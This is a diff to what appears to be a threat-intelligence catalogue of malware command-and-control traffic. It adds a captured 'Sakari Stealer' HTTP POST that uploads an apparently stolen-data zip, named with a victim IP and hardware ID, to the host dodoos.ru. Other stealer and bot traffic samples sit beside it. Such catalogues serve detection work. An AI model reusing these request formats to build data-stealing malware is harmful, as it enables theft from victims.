@@ -2428,6 +2428,27 @@ InformationRevenge-RATUEVSRElSRevenge-RATX0M0QkEzNjQ3Revenge-RAT192.168.100.213R
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/rms.png "RMS RAT")
 
+#### Sakari Stealer
+~~~
+HTTP/1.1 100 Continue
+
+POST /fifa/fifa.php?hwid=U3LZDGVTLKNOYXJBXQ&ci=895317359&p=0&c=4&a=0&f=0&t=0&fz=0&s=0&cr=0&ds=0&dd=&pd=0
+
+HTTP/1.1
+Content-Type: multipart/form-data; boundary=---------------------8d7a406c7491109
+Host: dodoos.ru
+Content-Length: 168940
+Expect: 100-continue
+Connection: Keep-Alive
+
+-----------------------8d7a406c7491109
+Content-Disposition: form-data; name="file"; filename="[US]174.208.31.102_U3LZDGVTLKNOYXJBXQ.zip"
+Content-Type: application/octet-stream
+
+PK.........{<PJ.7y....]...	...image.pngd.y4...>n..,.e..THb.k..Q..D..Yf.1..+.wf..NTv..i....!.a.........}..9..3..y.u].u_..<..f.....SQQ....YQQ..RQ.R.c8.dB...._..V.:T..W..]..i....B#.O...]3=3........P..T.PQQ*...m.;.&3.....G..SO...../|.\.|..7.1b/U.w..K.......j..k.J.z..%..L....u..+..".O..H>..F....Z.e.7.4..9RvH.w...g?...../.............i..v.........
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/sakari.png "Sakari")
+
 #### Sarwent BOT
 ~~~
 GET /gate/connect?os=Windows+7+Release+Preview+(Build%3A+7601+-+Service+Pack%3A+1.0)+&bits=x64&av=Not+found HTTP/1.1
